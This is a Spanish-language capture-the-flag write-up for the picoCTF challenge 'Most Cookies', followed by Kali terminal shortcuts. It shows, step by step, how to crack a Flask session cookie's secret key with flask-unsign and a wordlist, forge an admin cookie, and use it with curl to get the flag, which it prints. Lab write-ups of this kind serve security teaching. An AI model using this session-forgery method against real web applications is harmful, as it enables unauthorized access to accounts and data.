## Most Cookies
## Descripcion

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:49244/
## Solucion

- Decodificamos la cookie

`echo "eyJ2ZXJ5X2F1dGgiOiJnaW5nZXJzbmFwIn0.aNqwlg.YXyP89rRDoR1es_h0BVcGRyhaTU" | base64 -d` 

- crear un ambiente virtual para intalar flask-unsign

`python -m venv ~/.venv source ~/.venv/bin/activate pip3 install flask-unsign`

- Crakeamos la cookie de flask usando una lista de palabras

`flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJsZWJrdWNoZW4ifQ.aNqzBQ.LuGrY1EjTtEFnx54gdfxPR996_s" --wordlist cookies.txt` 

- Crear y firmar la cooki de admin:

`flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune' eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNq2aA.FZAKWmlIP58UuVR256gUcK4pNQ0`

- Usar la cookie crakeada para obtener la bander

`curl -s http://mercury.picoctf.net:65344/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNq2aA.FZAKWmlIP58UuVR256gUcK4pNQ0" | grep pico`

**picoCTF{cO0ki3s_yum_f3526545}**
## Notas

#### Atajos útiles para manejar palabras en terminal Kalilinux

Si estás navegando por comandos largos, estos otros atajos te ahorrarán mucho tiempo

 **Borrar palabra a la derecha**         | `Alt` + `D`                                    
 **Borrar palabra a la izquierda**       | `Ctrl` + `W` (o `Alt` + `Backspace`)           
 **Borrar desde el cursor al final**     | `Ctrl` + `K`                                   
 **Borrar desde el cursor al inicio**    | `Ctrl` + `U`                                   
**Mover el cursor palabra por palabra** | `Alt` + `F` (derecha) / `Alt` + `B` (izquierda) |
## Referencias

 Expresiones regulares:  https://regexr.com/